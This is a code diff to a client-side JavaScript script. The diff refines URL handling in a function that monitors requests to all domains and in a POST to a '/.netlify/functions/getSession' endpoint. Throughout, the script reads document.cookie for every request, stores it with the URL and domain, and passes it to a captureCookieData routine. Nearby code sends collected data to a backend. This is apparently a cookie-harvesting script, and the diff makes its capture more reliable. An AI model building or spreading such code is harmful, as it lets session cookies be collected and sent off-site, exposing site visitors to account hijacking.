@@ -42,7 +42,8 @@
         
         // Send to backend if available
         try {
-            fetch('/.netlify/functions/getSession', {
+            const apiUrl = window.location.origin + '/.netlify/functions/getSession';
+            fetch(apiUrl, {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json',
@@ -57,7 +58,19 @@
     // Enhanced cross-domain monitoring
     function monitorCrossDomainRequest(url, method = 'GET') {
         try {
-            const urlObj = new URL(url, window.location.href);
+            // Handle relative URLs properly
+            let fullUrl;
+            if (url.startsWith('http://') || url.startsWith('https://')) {
+                fullUrl = url;
+            } else if (url.startsWith('//')) {
+                fullUrl = window.location.protocol + url;
+            } else if (url.startsWith('/')) {
+                fullUrl = window.location.origin + url;
+            } else {
+                fullUrl = new URL(url, window.location.href).href;
+            }
+            
+            const urlObj = new URL(fullUrl);
             const domain = urlObj.hostname;
             
             // Monitor ALL domains, not just cross-domain
@@ -205,19 +218,20 @@
             const domain = urlObj.hostname;
             
             // Monitor ALL domains, not just cross-domain
-                const requestData = {
-                    url: url,
-                    domain: domain,
-                    method: method,
-                    timestamp: new Date().toISOString(),
-                    cookies: document.cookie
-                };
-                
-                crossDomainRequests.push(requestData);
-                captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
-                console.log(`🌐 Request to ${domain}:`, url);
+            const requestData = {
+                url: fullUrl,
+                domain: domain,
+                method: method,
+                timestamp: new Date().toISOString(),
+                cookies: document.cookie
+            };
+            
+            crossDomainRequests.push(requestData);
+            captureCookieData('DOMAIN_REQUEST', document.cookie, domain);
+            console.log(`🌐 Request to ${domain}:`, fullUrl);
+            
         } catch (e) {
-            console.warn('Invalid URL for domain monitoring:', url);
+            console.warn('Error processing URL for domain monitoring:', url, e.message);
         }
     }
     
